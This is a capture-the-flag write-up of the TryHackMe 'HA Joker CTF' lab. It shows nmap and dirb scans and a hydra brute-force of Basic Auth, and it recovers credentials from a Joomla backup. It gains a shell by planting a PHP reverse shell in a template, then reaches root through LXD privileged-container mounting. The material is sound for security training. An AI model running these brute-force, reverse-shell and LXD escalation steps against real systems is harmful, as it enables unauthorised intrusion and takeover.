---
title: "HA Joker CTF - TryHackMe"
author: Ludovic COULON
date: 2020-06-15
hero: ./images/hero.jpeg
excerpt: "Writeup for the HA Joker CTF room on TryHackMe"
---

[TryHackMe | HA Joker CTF](https://tryhackme.com/room/jokerctf)

We have developed this lab for the
purpose of online penetration practices. Solving this lab is not that
tough if you have proper basic knowledge of Penetration testing. Let’s
start and learn how to breach it.

1. **Enumerate Services**

   - Nmap

2. **Bruteforce**

   - Performing Bruteforce on files over http

   - Performing Bruteforce on Basic Authentication

3. **Hash Crack**

   - Performing Bruteforce on hash to crack zip file- Performing Bruteforce on hash to crack mysql user

4. **Exploitation**

   - Getting a reverse connection- Spawning a TTY Shell

5. **Privilege Escalation**

   - Get root taking advantage of flaws in LXD

---

### #1 Enumerate services on target machine.

```bash
➜  TryHackMe nmap -A -vv 10.10.50.172
```

```bash
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ad:20:1f:f4:33:1b:00:70:b3:85:cb:87:00:c4:f4:f7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDL89x6yGLD8uQ9HgFK1nvBGpjT6KJXIwZZ56/pjgdRK/dOSpvl0ckMaa68V9bLHvn0Oerh2oa4Q5yCnwddrQnm7JHJ4gNAM+lg+ML7+cIULAHqXFKPpPAjvEWJ7T6+NRrLc9q8EixBsbEPuNer4tGGyUJXg6GpjWL5jZ79TwZ80ANcYPVGPZbrcCfx5yR/1KBTcpEdUsounHjpnpDS/i+2rJ3ua8IPUrqcY3GzlDcvF7d/+oO9GxQ0wjpy1po6lDJ/LytU6IPFZ1Gn/xpRsOxw0N35S7fDuhn69XlXj8xiDDbTlOhD4sNxckX0veXKpo6ynQh5t3yM5CxAQdqRKgFF
|   256 1b:f9:a8:ec:fd:35:ec:fb:04:d5:ee:2a:a1:7a:4f:78 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOzF9YUxQxzgUVsmwq9ZtROK9XiPOB0quHBIwbMQPScfnLbF3/Fws+Ffm/l0NV7aIua0W7FLGP3U4cxZEDFIzfQ=
|   256 dc:d7:dd:6e:f6:71:1f:8c:2c:2c:a1:34:6d:29:99:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPLWfYB8/GSsvhS7b9c6hpXJCO6p1RvLsv4RJMvN4B3r

80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HA: Joker

8080/tcp open  http    syn-ack Apache httpd 2.4.29
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Please enter the password.
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 401 Unauthorized
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### #2 What version of Apache is it?

```bash
http-server-header: Apache/2.4.29 (Ubuntu)
```

### #3 What port on this machine not need to be authenticated by user and password?

<div className="Image__Medium">
  <img src="https://imgur.com/4oZrYi8.png" alt="blog_image" />
</div>

The port 8080 need a password so by elimination this is the port 80

### #4 There is a file on this port that seems to be secret, what is it?

```bash
➜  TryHackMe dirb http://10.10.50.172/ -X .txt,.php,.html,.js
```

```bash
-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sun Jun 14 20:18:26 2020
URL_BASE: http://10.10.50.172/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
EXTENSIONS_LIST: (.txt,.php,.html,.js) | (.txt)(.php)(.html)(.js) [NUM = 4]

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.10.50.172/ ----
+ http://10.10.50.172/index.html (CODE:200|SIZE:5954)
+ http://10.10.50.172/phpinfo.php (CODE:200|SIZE:94842)
+ http://10.10.50.172/secret.txt (CODE:200|SIZE:320)
```

<div className="Image__Medium">
  <img src="https://imgur.com/GqDcIUg.png" alt="blog_image" />
</div>

### #5 There is another file which reveals information of the backend, what is it?

```bash
+ http://10.10.50.172/phpinfo.php (CODE:200|SIZE:94841)
```

<div className="Image__Medium">
  <img src="https://imgur.com/J4uWcNf.png" alt="blog_image" />
</div>

### #6 When reading the secret file, We find with a conversation that seems

contains at least two users and some keywords that can be interesting,
what user do you think it is?

```
Batman hits Joker.
Joker: "Bats you may be a rock but you won't break me." (Laughs!)
Batman: "I will break you with this rock. You made a mistake now."
Joker: "This is one of your 100 poor jokes, when will you get a sense of humor bats! You are dumb as a rock."
Joker: "HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA!"
```

The two "user" are Joker or Batman I tried Joker and it worked (weird question 😏)

### #7 What port on this machine need to be authenticated by Basic Authentication Mechanism?

<div className="Image__Medium">
  <img src="https://imgur.com/4oZrYi8.png" alt="blog_image" />
</div>

```
8080
```

### #8 At this point we have one user and a URL that needs to be authenticated, brute force it to get the password, what is that password?

```
➜  TryHackMe hydra -s 8080 -l joker -P /usr/share/wordlists/rockyou.txt -t 16 10.10.50.172 http-get
```

<div className="Image__Medium">
  <img src="https://imgur.com/3JjNPZ7.png" alt="blog_image" />
</div>

```
joker:hannah
```

### #9 Yeah!! We got the user and password and we see a CMS based blog. Now check for directories and files in this port. What directory looks like as admin directory?

<div className="Image__Medium">
  <img src="https://imgur.com/QJUOsil.png" alt="blog_image" />
</div>

<div className="Image__Medium">
  <img src="https://imgur.com/R89INH2.png" alt="blog_image" />
</div>

```
/administrator/
```

### #10 We need access to the administration of the site in order to get a shell, there is a backup file, What is this file?

```
➜  TryHackMe wget --user=joker --password=hannah http://10.10.50.172:8080/backup.zip
```

### #11 We have the backup file and now we should look for some information, for example database, configuration files, etc ... But the backup file seems to be encrypted. What is the password?

<div className="Image__Medium">
  <img src="https://imgur.com/SZj24Co.png" alt="blog_image" />
</div>

```
password:hannah
```

### #12 Remember that... We need access to the administration of the site... Blah blah blah. In our new discovery we see some files that have compromising information, maybe db? ok what if we do a restoration of the database! Some tables must have something like user_table! What is the super duper user?

```
➜  db cat joomladb.sql | grep user
```

<div className="Image__Medium">
  <img src="https://imgur.com/6Z4NnIH.png" alt="blog_image" />
</div>

### #13 Super Duper User! What is the password?

<div className="Image__Medium">
  <img src="https://imgur.com/GDvoxgA.png" alt="blog_image" />
</div>

```
?:abcd1234
```

### #14 At this point, you should be upload a reverse-shell in order to gain shell access. What is the owner of this session?

```
user: admin
pass: abcd1234
```

I tried to upload a php shell but nothing came out let's try to modify some php files like wordpress 🤤

<div className="Image__Medium">
  <img src="https://imgur.com/X5emCm4.png" alt="blog_image" />
</div>

<div className="Image__Medium">
  <img src="https://imgur.com/4pN759x.png" alt="blog_image" />
</div>

[](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)

<div className="Image__Medium">
  <img src="https://imgur.com/ATIJiLL.png" alt="blog_image" />
</div>

```
uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
answer = www-data
```

### #15 This user belongs to a group that differs on your own group, What is this group?

```
115(lxd)
answer = lxd
```

### #16 Spawn a tty shell.

```
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

### #17 In this question you should be do a basic research on how linux containers (LXD) work, it has a small online tutorial. Googling "lxd try it

online".

```
No answer needed
```

### #18 List the image installed on the lxd-service, what is the ALIAS of this image?

[LXD cheat sheet for beginners](https://bartsimons.me/lxd-cheat-sheet-for-beginners/)

```
$ lxc image ls
```

```
myalpine
```

### #19 **The idea here is to mount the root of the OS file system on the container, this should give us access to the root directory.** Create the container with the privilege true and mount the root file system on /mnt in order to gain access to /root directory on host machine.

```
No answer needed
```

### #20 What is the name of the file in the /root directory?

[Lxd Privilege Escalation](https://www.hackingarticles.in/lxd-privilege-escalation/)

```
$ lxc init myalpine joker -c security.privileged=true
$ lxc config device add joker mydevice disk source=/ path=/mnt/root recursive=true
$ lxc start joker
$ lxc exec ignite /bin/sh
```

```
final.txt
```


